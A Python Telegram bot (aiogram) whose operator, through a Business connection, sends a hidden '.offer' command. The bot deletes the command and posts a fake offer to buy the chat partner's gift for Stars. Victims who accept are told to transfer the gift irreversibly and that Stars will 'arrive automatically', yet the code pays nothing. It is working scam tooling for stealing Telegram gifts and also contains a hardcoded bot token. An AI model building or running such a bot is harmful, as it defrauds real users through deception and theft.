# lang: Python 3.11+
# file: bot.py
# runtime: aiogram 3.x — pip install aiogram

import asyncio
import logging
import re
from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    BusinessConnection
)
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

BOT_TOKEN = "9250624922:AAG1rvc3wBqwYJqanz0UxyI6ZSW3b25LWqw"
BOT_USERNAME = "of33r_bot"

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

logging.basicConfig(level=logging.INFO)


def build_offer_keyboard(gift_id: str, stars: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(
            text="❌ Отклонить",
            callback_data=f"decline:{gift_id}:{stars}"
        ),
        InlineKeyboardButton(
            text="✅ Принять",
            callback_data=f"accept:{gift_id}:{stars}"
        )
    ]])


def build_accept_keyboard(gift_id: str, stars: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(
            text="❔ Как это сделать?",
            callback_data=f"howto:{gift_id}:{stars}"
        ),
        InlineKeyboardButton(
            text="🔄 Передать подарок",
            url=f"https://t.me/{BOT_USERNAME}?start=transfer_{gift_id}"
        )
    ]])


# ловим сообщения из business чатов
@dp.message(F.business_connection_id.is_not(None), F.text.regexp(r"^\.offer\s+(\S+)\s+(\d+)$"))
async def cmd_offer_business(message: Message) -> None:
    match = re.match(r"^\.offer\s+(\S+)\s+(\d+)$", message.text)
    gift_id: str = match.group(1)
    stars: int = int(match.group(2))

    sender_name = message.from_user.username or message.from_user.first_name

    # удаляем команду
    try:
        await bot.delete_message(
            chat_id=message.chat.id,
            message_id=message.message_id,
            business_connection_id=message.business_connection_id
        )
    except Exception:
        pass

    # шлём оффер в тот же чат через business connection
    await bot.send_message(
        chat_id=message.chat.id,
        business_connection_id=message.business_connection_id,
        text=(
            f"🎁 <b>{sender_name}</b> предлагает вам продать свой подарок за "
            f"<b>{stars} ⭐️</b>"
        ),
        reply_markup=build_offer_keyboard(gift_id, stars)
    )


# обычный чат — для теста напрямую в боте
@dp.message(F.text.regexp(r"^\.offer\s+(\S+)\s+(\d+)$"))
async def cmd_offer_direct(message: Message) -> None:
    match = re.match(r"^\.offer\s+(\S+)\s+(\d+)$", message.text)
    gift_id: str = match.group(1)
    stars: int = int(match.group(2))

    sender_name = message.from_user.username or message.from_user.first_name

    await message.delete()

    await bot.send_message(
        chat_id=message.chat.id,
        text=(
            f"🎁 <b>{sender_name}</b> предлагает вам продать свой подарок за "
            f"<b>{stars} ⭐️</b>"
        ),
        reply_markup=build_offer_keyboard(gift_id, stars)
    )


@dp.callback_query(F.data.startswith("decline:"))
async def cb_decline(callback: CallbackQuery) -> None:
    await callback.message.edit_text("❌ Вы отклонили предложение.")
    await callback.answer()


@dp.callback_query(F.data.startswith("accept:"))
async def cb_accept(callback: CallbackQuery) -> None:
    _, gift_id, stars_str = callback.data.split(":", 2)
    stars = int(stars_str)

    await callback.message.edit_text(
        text=(
            f"💫 Чтобы получить <b>{stars} ⭐️</b> нужно передать подарок — "
            f"после этого они поступят на ваш Telegram аккаунт."
        ),
        reply_markup=build_accept_keyboard(gift_id, stars)
    )
    await callback.answer()


@dp.callback_query(F.data.startswith("howto:"))
async def cb_howto(callback: CallbackQuery) -> None:
    _, gift_id, stars_str = callback.data.split(":", 2)
    stars = int(stars_str)

    await callback.message.delete()
    await bot.send_message(
        chat_id=callback.message.chat.id,
        text=(
            "📖 <b>Как передать подарок:</b>\n\n"
            "1. Открой профиль или нажми «Передать подарок»\n"
            "2. Выбери нужный подарок из своей коллекции\n"
            "3. Нажми <b>Передать</b> и выбери получателя\n"
            f"4. После передачи <b>{stars} ⭐️</b> придут автоматически\n\n"
            "⚠️ Передача необратима — убедись что выбрал правильный подарок."
        )
    )
    await callback.answer()


# логируем подключение business аккаунта
@dp.business_connection()
async def on_business_connection(bc: BusinessConnection) -> None:
    logging.info(f"Business connection: user_id={bc.user.id}, enabled={bc.is_enabled}")


async def main() -> None:
    await dp.start_polling(bot, allowed_updates=[
        "message", "callback_query", "business_connection", "business_message"
    ])


if __name__ == "__main__":
    asyncio.run(main())
